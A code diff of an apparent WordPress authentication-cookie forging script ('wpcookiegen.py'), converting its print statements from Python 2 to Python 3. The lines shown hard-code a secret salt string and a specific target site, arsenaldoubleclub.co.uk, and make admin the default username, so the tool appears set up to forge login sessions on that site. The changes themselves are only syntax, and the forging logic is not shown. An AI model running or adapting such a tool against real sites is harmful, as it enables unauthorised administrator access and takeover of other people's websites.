@@ -68,7 +68,7 @@ def gen_cookies(username, expiration, pass_frag, key, salt, target):
 	print ('\n[+] Cookie gen complete. ' + str(i) + ' cookie(s) created.');
 
 	if i == 1:
-		print '[+] Cookie: ' + allcookies.split(':')[2]
+		print ('[+] Cookie: ' + allcookies.split(':')[2])
 	else:
 		# write cookies to file
 		filename = cookie_id.split('_')[1].split('=')[0] + '_' + username + '_cookies.txt'
@@ -86,9 +86,9 @@ def main(argv):
 	salt = '!EurE[[1[^m3d(e} B#g5+oYSUFi:CL]7,jR{9W;zc%[7?[UfwU*G.;z!,+ygSKq'
 	target = 'https://www.arsenaldoubleclub.co.uk'
 
-	print "\nWordPress Auth Cookie Generator"
-	print "Author: Mike Czumak (T_v3rn1x) - @SecuritySift - securitysift.com"
-	print "Purpose: Generates WP auth cookies (requires valid Secret Key and Salt)"
+	print ("\nWordPress Auth Cookie Generator")
+	print ("Author: Mike Czumak (T_v3rn1x) - @SecuritySift - securitysift.com")
+	print ("Purpose: Generates WP auth cookies (requires valid Secret Key and Salt)")
 
 	usage = '''\nUsage: wpcookiegen.py\n\nOptions:
 	-u <username> (default is admin)
@@ -103,12 +103,12 @@ def main(argv):
 	try:
 		opts, args = getopt.getopt(argv,'hu:f:e:s:')
 	except getopt.GetoptError:
-		print usage
+		print (usage)
 		sys.exit(2)
 
 	for opt, arg in opts:
 		if opt == '-h':
-			print usage
+			print (usage)
 			sys.exit()
 		elif opt == '-u':
 			username = arg
